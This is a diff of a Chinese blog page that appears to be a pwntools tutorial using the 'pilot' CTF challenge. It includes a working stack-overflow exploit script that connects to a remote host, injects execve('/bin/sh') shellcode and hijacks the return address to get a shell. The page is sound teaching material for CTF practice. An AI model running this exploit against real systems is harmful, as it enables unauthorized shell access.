@@ -6,11 +6,12 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>怪咖的小屋</title>
+  <title>Pythonpwn使用方法 | 怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="Pythonpwn使用方法基础用法：以实验吧 pilot为例： 123456789101112131415161718192021222324252627282930# -*- coding:utf-8 -*-from  pwn  import  *  #导入pwn#remote建立远程连接，需要参数(ip,port)#如果本地执行的话:#p = process(&apos;./pilot&apos;)p  =  r">
+<meta name="keywords" content="pwn,python">
 <meta property="og:type" content="article">
-<meta property="og:title" content="怪咖的小屋">
+<meta property="og:title" content="Pythonpwn使用方法">
 <meta property="og:url" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
 <meta property="og:description" content="Pythonpwn使用方法基础用法：以实验吧 pilot为例： 123456789101112131415161718192021222324252627282930# -*- coding:utf-8 -*-from  pwn  import  *  #导入pwn#remote建立远程连接，需要参数(ip,port)#如果本地执行的话:#p = process(&apos;./pilot&apos;)p  =  r">
@@ -21,9 +22,9 @@
 <meta property="og:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/1368de3c660aae209011eb00e1f46bb2.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/09c4c9f5be43b6c0fefa5ce448f06a4d.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/1c01dec99118cee6ee97d2eba68d2546.png">
-<meta property="og:updated_time" content="2019-09-10T09:44:45.330Z">
+<meta property="og:updated_time" content="2019-09-10T10:09:51.807Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="怪咖的小屋">
+<meta name="twitter:title" content="Pythonpwn使用方法">
 <meta name="twitter:description" content="Pythonpwn使用方法基础用法：以实验吧 pilot为例： 123456789101112131415161718192021222324252627282930# -*- coding:utf-8 -*-from  pwn  import  *  #导入pwn#remote建立远程连接，需要参数(ip,port)#如果本地执行的话:#p = process(&apos;./pilot&apos;)p  =  r">
 <meta name="twitter:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/0de3cdb6d972dfb8fbc88e35fc4d36e0.png">
   
@@ -160,9 +161,24 @@
             <article id="post-Pythonpwn使用方法" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Pythonpwn使用方法
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/Pythonpwn使用方法/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Pythonpwn使用方法"><a href="#Pythonpwn使用方法" class="headerlink" title="Pythonpwn使用方法"></a><strong>Pythonpwn使用方法</strong></h3><h4 id="基础用法："><a href="#基础用法：" class="headerlink" title="基础用法："></a><strong>基础用法：</strong></h4><p>以<strong>实验吧 pilot</strong>为例：</p>
+        <h3 id="Pythonpwn使用方法"><a href="#Pythonpwn使用方法" class="headerlink" title="Pythonpwn使用方法"></a>Pythonpwn使用方法</h3><h4 id="基础用法："><a href="#基础用法：" class="headerlink" title="基础用法："></a><strong>基础用法：</strong></h4><p>以<strong>实验吧 pilot</strong>为例：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *  <span class="comment">#导入pwn</span></span><br><span class="line"><span class="comment">#remote建立远程连接，需要参数(ip,port)</span></span><br><span class="line"><span class="comment">#如果本地执行的话:</span></span><br><span class="line"><span class="comment">#p = process('./pilot')</span></span><br><span class="line">p  =  remote(<span class="string">"106.2.25.7"</span>,<span class="number">8003</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Location:'</span>)  <span class="comment">#接收信息直到出现关键字'Location'</span></span><br><span class="line">addr  =  int  (p.recvuntil(<span class="string">'\n'</span>)[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)  <span class="comment">#将之后接收到的信息的14位16进制数转成int存储起来</span></span><br><span class="line"><span class="keyword">print</span>  addr</span><br><span class="line"></span><br><span class="line">shellcode  =  <span class="string">'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#布局</span></span><br><span class="line">payload  =  shellcode  +  ((<span class="number">40</span>  -  len(shellcode))*<span class="string">'A'</span>)  +  p64(addr)</span><br><span class="line"><span class="comment">#接收信息直到出现关键字'Command:'</span></span><br><span class="line">p.recvuntil(<span class="string">'Command:'</span>)</span><br><span class="line"><span class="comment">#将payload发送出去</span></span><br><span class="line"><span class="comment">#p.sendline()发送之后默认在后面加换行</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line">p.send(payload+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#与其进行交互</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">利用思路：cyclic 100计算溢出偏移长度,Location定位字符串开始的位置,布局为 shellcode+padding+addr</span></span><br><span class="line"><span class="string">执行到返回,劫持返回地址到addr,addr指向Location,即字符串开始的位置,之后执行shellcode,拿到shell</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cat home/flag</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="shellcode生成操作-汇编转操作码-："><a href="#shellcode生成操作-汇编转操作码-：" class="headerlink" title="shellcode生成操作(汇编转操作码)："></a><strong>shellcode生成操作(汇编转操作码)：</strong></h4><p>以<strong>实验吧</strong>  <strong>加减乘除</strong>为例：<br><img src="/2019/09/10/Pythonpwn使用方法/0de3cdb6d972dfb8fbc88e35fc4d36e0.png" alt><br>代码如下：</p>
@@ -216,6 +232,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">pwn,python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -280,18 +307,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/09/10/格式化字符串漏洞利用/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/09/10/GIT游戏/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          (no title)
+          GIT游戏
         
       </div>
     </a>
   
   
-    <a href="/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title"></div>
+    <a href="/2019/09/10/Python字符串开头b r u含义/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Python字符串开头b r u含义</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -415,6 +442,38 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">pwn,格式化字符串</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">pwn,栈,溢出</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">pwn,python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">pwn,ROP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">pwn,ROP,ret2dlresolve</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">re</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
